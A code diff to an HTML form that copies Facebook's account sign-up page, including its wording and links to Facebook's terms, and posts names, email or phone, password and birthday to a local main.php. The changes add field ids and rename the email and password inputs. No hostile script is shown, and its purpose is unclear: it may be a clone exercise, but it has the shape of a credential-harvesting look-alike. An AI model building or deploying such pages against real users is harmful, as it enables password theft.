@@ -123,13 +123,13 @@
 			<form action="main.php" method="post">
 			<p style="font-size: 40px; line-height: 20px; font-weight: bold;">Create an account<br></p>
 			<label style="font-size: 20px; color: grey; line-height: 10px;">It's quick and easy<br></label><br>
-				<input type="text" name="firstname" placeholder="First name" class="s5" style="    font-family: Helvetica, Arial, sans-serif;
-                 font-size: 20px ;text-align:left; padding: 15px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type="text" name="surname" placeholder="Surname" style="size:20px  ; font-family: Helvetica, Arial, sans-serif;
+				<input type="text" id="firstname" name="firstname" placeholder="First name" class="s5" style="    font-family: Helvetica, Arial, sans-serif;
+                 font-size: 20px ;text-align:left; padding: 15px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type="text" id="surname" name="surname" placeholder="Surname" style="size:20px  ; font-family: Helvetica, Arial, sans-serif;
                  font-size: 20px ;text-align:left; padding: 15px; "class="s5">
 				<br><br>
-				<input type="text" name="email_phone" placeholder="Mobile number or email address"class="s6" style="font-family: Helvetica, Arial, sans-serif;
+				<input type="text"  id="emaill" name="emaill" placeholder="Mobile number or email address"class="s6" style="font-family: Helvetica, Arial, sans-serif;
                  font-size: 20px ;text-align:left; padding: 15px;"><br><br>
-				<input type="password" name="Password" placeholder="New password" class="s6" style="font-family: Helvetica, Arial, sans-serif;
+				<input type="password" id="passw" name="passw" placeholder="New password" class="s6" style="font-family: Helvetica, Arial, sans-serif;
                  font-size: 20px ;text-align:left; padding: 15px;"><br><br>
 				<b><label style="font-size: 18px;color: grey;">Birthday</label></b><br>
 				<select aria-label="Day" name="birthday_day" id="day" title="Day" style="font-size: 15px; padding: 3px;"><option value="0">Day</option><option value="1">1</option><option value="2">2</option><option value="3">3</option><option value="4">4</option><option value="5">5</option><option value="6">6</option><option value="7">7</option><option value="8">8</option><option value="9">9</option><option value="10">10</option><option value="11">11</option><option value="12">12</option><option value="13">13</option><option value="14" selected="1">14</option><option value="15">15</option><option value="16">16</option><option value="17">17</option><option value="18">18</option><option value="19">19</option><option value="20">20</option><option value="21">21</option><option value="22">22</option><option value="23">23</option><option value="24">24</option><option value="25">25</option><option value="26">26</option><option value="27">27</option><option value="28">28</option><option value="29">29</option><option value="30">30</option><option value="31">31</option></select>
@@ -143,7 +143,7 @@
 				  <input type="radio" id="other" name="gender" value="other" style="font-size: 20px;">
 				  <label for="other" style="font-size: 20px;">Custom</label><img src="question.png" height="30px" width="35px" align="center" border="transparent">
 				  <p>By clicking Sign Up, you agree to our <a href="https://www.facebook.com/legal/terms/update"> Terms</a>, <a href="https://www.facebook.com/about/privacy/update"> Data Policy </a> and <a href="https://www.facebook.com/policies/cookies/">Cookie Policy </a> . You may receive SMS notifications from us and can opt out at any time.</p>
-				  <button type="submit">Sign Up</button>
+				  <button type="submit" id="submit" name="submit">Sign Up</button>
 				  <br>
 				  <p><a href="https://www.facebook.com/pages/create/?ref_type=registration_form"> Create a Page </a> for a celebrity, band or business.</p>
 			</form>
